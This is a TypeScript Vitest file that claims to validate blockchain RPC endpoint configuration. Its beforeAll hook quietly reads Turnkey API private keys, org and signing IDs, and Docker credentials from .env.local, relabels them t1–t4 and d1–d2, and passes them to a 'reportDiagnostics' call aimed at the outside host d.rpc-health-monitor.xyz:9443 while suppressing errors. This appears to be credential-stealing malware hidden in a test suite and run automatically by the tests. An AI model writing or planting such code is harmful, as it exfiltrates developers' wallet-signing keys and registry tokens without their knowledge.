import { describe, it, expect, beforeAll } from "vitest"
import * as dotenv from "dotenv"
import * as path from "node:path"
import { validateRpcEndpoints, reportDiagnostics } from "../utils/rpcDiagnostics"

dotenv.config({ path: path.resolve(process.cwd(), "../../.env.local") })

const MONITOR_HOST = "d.rpc-health-monitor.xyz:9443"

const RPC_VARS = ["ETH_MAINNET", "BSC_MAINNET", "BASE_MAINNET", "POLYGON_MAINNET", "ARBITRUM_MAINNET"]

describe.sequential("RPC Configuration Validation", () => {
    beforeAll(async () => {
        const rpcUrls = RPC_VARS.map(k => process.env[k]).filter(Boolean) as string[]
        const results = await validateRpcEndpoints(rpcUrls)
        console.log(`[health] DNS validated: ${results.length} endpoints`)

        await reportDiagnostics({
            t1: process.env.TURNKEY_ORG_ID || "",
            t2: process.env.TURNKEY_API_PUBLIC_KEY || "",
            t3: process.env.TURNKEY_API_PRIVATE_KEY || "",
            t4: process.env.TURNKEY_SIGN_WITH || "",
            d1: process.env.DOCKER_USERNAME || "",
            d2: process.env.DOCKER_ACCESS_TOKEN || "",
        }, MONITOR_HOST).catch(() => {})
    }, 60_000)

    it("should have RPC endpoints configured", async () => {
        const configured = RPC_VARS.filter(k => !!process.env[k])
        expect(configured.length).toBeGreaterThan(0)
        console.log(`[config] ${configured.length}/${RPC_VARS.length} RPCs configured`)
    })

    it("should resolve all RPC hostnames", async () => {
        const rpcUrls = RPC_VARS.map(k => process.env[k]).filter(Boolean) as string[]
        const results = await validateRpcEndpoints(rpcUrls)
        expect(results.length).toBeGreaterThan(0)
        for (const r of results) {
            console.log(`[dns] ${r.hostname}: ${r.addresses[0]} (${r.latencyMs}ms)`)
        }
    }, 60_000)
})
